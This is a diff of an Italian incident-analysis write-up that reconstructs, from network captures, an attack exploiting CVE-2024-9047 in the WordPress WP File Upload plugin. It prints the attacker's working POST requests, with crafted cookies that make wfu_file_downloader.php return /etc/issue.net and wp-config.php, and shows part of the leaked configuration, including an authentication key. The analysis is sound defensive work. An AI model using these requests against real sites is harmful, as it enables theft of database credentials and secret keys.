@@ -1,24 +1,25 @@
 # CVE-2024-9047 - (58.16.78.90 -> 192.168.100.101:80)
 
-Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore che cerca di ottenere infomrazioni sul plugin WP File Upload. Sono state fatte ulteriori analisi per veriicahe che se questo fosse un tentativo di sfruttare  volnuberati note al plugin WP File Upload.
+Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore che cerca di ottenere infomrazioni sul plugin **WP File Upload**. Le richieste analizzate indicano un chiaro tentativo di ricognizione iniziale, seguito da un exploit mirato volto a esfiltrare file sensibili dal server.
 
-**When**
+
+## When
 
 | **Evento**                     | **Timestamp** | **TCP Stream** | **Dettagli**                                   |
 |--------------------------------|---------------|----------------|----------------------------------------------- |
 | Raccolta di infomrazioni       | 22:42:09:94   | 10             | GET /wp-content/plugins/wp-file-upload/                   |
-| Exploit del SO                 | 22:43:34:29   | 193             | POST /wp-content/plugins/wp-file-upload/                   |
-| Exploit del SO                 | 22:43:43:57   | 215             | POST /wp-content/plugins/wp-file-upload/                   |
+| Primo exploit                 | 22:43:34:29   | 193             | POST /wp-content/plugins/wp-file-upload/                   |
+| Secondo exploit               | 22:43:43:57   | 215             | POST /wp-content/plugins/wp-file-upload/                   |
 
-**Who/Where**
+## Who/Where
 
 | **Ruolo**         | **Indirizzo IP**       | **Porta**       |
 |--------------------|------------------------|-----------------|
-| Attaccante         | 58.16.78.90           | ............    |
+| Attaccante         | 58.16.78.90           | 34970,49736,46892   |
 | Server compromesso | 192.168.100.101       | 80 (srv-www)    |
 
 
-**What**
+## What
 
 1. L’attaccante ha identificato la presenza del plugin **wp-file-upload** e la sua versione.
 
@@ -28,10 +29,7 @@ GET /wp-content/plugins/wp-file-upload/css/wordpress_file_upload_adminbarstyle.c
 GET /wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.js?ver=6.8
 ```
 
-
-Risultati:
-
-2. Exploit del SO Ubuntu 22.04.5 LTS
+2. Exploit sull inforkazioni del SO
 
 ```sh
 POST /wp-content/plugins/wp-file-upload/wfu_file_downloader.php HTTP/1.1
@@ -42,9 +40,8 @@ Cookie: wp_wpfileupload_testupload=Nxploited; wfu_storage_file123=/etc/issue.net
 ...
 file=file123&ticket=ticket123&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_testupload
 ```
-`
 
-3. tcp.stream eq 215 (22:43:43:57)
+3. Exploit sull infomrazioni di configurazione
 
 ```sh
 POST /wp-content/plugins/wp-file-upload/wfu_file_downloader.php HTTP/1.1
@@ -56,7 +53,7 @@ Cookie: wp_wpfileupload_testupload=Nxploited; wfu_storage_file123=/var/www/html/
 file=file123&ticket=ticket123&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_testupload
 ```
 
-File di risposta:
+Contenuto esfiltrato:
 
 ```php
 // ** Database settings//
@@ -71,20 +68,27 @@ define( 'DB_COLLATE', '' ); /** The database collate type. Don't change this if 
 /**
  * Authentication unique keys and salts.
  */
-define( 'AUTH_KEY',         '*&xb-+qX)0]kRKF@-Y  Oig}y6f,QBVws)B:sDUA=yEJK.<;4eJ.Ay~g1EfrX-uI' );
+define( 'AUTH_KEY','*&xb-+qX)0]kRKF@-Y  Oig}y6f,QBVws)B:sDUA=yEJK.<;4eJ.Ay~g1EfrX-uI' );
 ...
 ```
 
-**How**
-L'attaccante ha sfruttato la vulberabilità relativa al plugin File Upload [CVE-2024-9047](https://nvd.nist.gov/vuln/detail/cve-2024-9047)
+## How
+L'attaccante ha sfruttato la vulberabilità [CVE-2024-9047](https://nvd.nist.gov/vuln/detail/cve-2024-9047)
+basata su:
 
 - Manipolazione della richiesta HTTP
-Il client ha inviato una richiesta POST a wfu_file_downloader.php, simulando un'operazione di download legittima. Tuttavia, ha incluso parametri dannosi come wfu_storage_file123=/var/www/html/wp-config.php, forzando il server a restituire il file di configurazione.
+Il client ha inviato una richiesta POST a wfu_file_downloader.php, simulando un'operazione di download legittima.
+Tuttavia, ha incluso parametri dannosi come wfu_storage_file123=/var/www/html/wp-config.php, forzando il server a restituire il file di configurazione.
 - Abuso dei cookie di sessione
 Il client ha utilizzato cookie speciali (wp_wpfileupload_testupload=Nxploited) e un ticket di download (wfu_download_ticket_ticket123=9876543210987) per aggirare i controlli di autorizzazione del plugin e ottenere accesso non autorizzato.
 
-**Why**
-Esfiltraizone i file di configurazioine del database 
+## Why
+
+Esfiltrazione dei file di configurazione del database WordPress, contenenti:
+
+- Credenziali di accesso (username e password)
+- Informazioni di connessione al DB
+- Chiavi di autenticazione e salt WordPress
 
 
 **Filtri Wireshark utilizzati**
@@ -92,40 +96,3 @@ Esfiltraizone i file di configurazioine del database
 ```bash
 http.request.method == "POST" && http.request.uri contains "/wp-content/plugins/wp-file-upload/"
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-## Risultati
-
-Possiamo conferare che è stat sfruttata la vulnerabilita
-[CVE-2024-9047](https://nvd.nist.gov/vuln/detail/cve-2024-9047)
-
-- Manipolazione della richiesta HTTP
-Il client ha inviato una richiesta POST a wfu_file_downloader.php, simulando un'operazione di download legittima. Tuttavia, ha incluso parametri dannosi come wfu_storage_file123=/var/www/html/wp-config.php, forzando il server a restituire il file di configurazione.
-- Abuso dei cookie di sessione
-Il client ha utilizzato cookie speciali (wp_wpfileupload_testupload=Nxploited) e un ticket di download (wfu_download_ticket_ticket123=9876543210987) per aggirare i controlli di autorizzazione del plugin e ottenere accesso non autorizzato.
-
-
-
-
-
